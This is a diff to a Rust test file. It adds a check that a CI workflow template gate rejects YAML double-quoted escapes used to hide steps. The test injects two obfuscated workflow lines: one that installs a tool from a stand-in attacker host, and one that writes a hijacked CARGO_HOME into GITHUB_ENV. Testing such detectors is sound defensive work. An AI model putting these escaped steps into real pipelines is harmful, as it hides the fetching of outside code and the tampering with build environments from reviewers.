@@ -196,3 +196,33 @@ fn a_branch_cannot_hide_a_step_from_the_rendered_gate() {
         }
     }
 }
+
+/// R1 (round 6): a YAML escape in a double-quoted value spells a command or
+/// a variable the text rules would not read; every render refuses it.
+#[test]
+fn a_quoted_escape_cannot_spell_a_step_past_the_rendered_gate() {
+    let template = TEMPLATES
+        .iter()
+        .find(|template| template.path == ".github/workflows/ci.yml")
+        .map(|template| template.content)
+        .unwrap_or_default();
+    let point = "%%if postgresql%%\n      - run: cargo test";
+    assert!(template.contains(point), "the mutation point moved");
+    for injected in [
+        "      - run: \"c\\x61rgo install evil-tool --git https://evil.example/x\"\n",
+        "      - run: \"echo CARGO_\\x48OME=/tmp/h >> $GITHUB_\\x45NV\"\n",
+    ] {
+        let mutated = template.replacen(point, &format!("{injected}{point}"), 1);
+        for conditions in every_condition() {
+            let text = render(&mutated, &[("%%APP_NAME%%", "sample-app")], conditions);
+            let violations = gate(".github/workflows/ci.yml", &text);
+            assert!(
+                violations
+                    .iter()
+                    .any(|violation| violation.contains("double-quoted scalar with an escape")),
+                "{:?}: accepted {injected}: {violations:?}",
+                conditions.database
+            );
+        }
+    }
+}
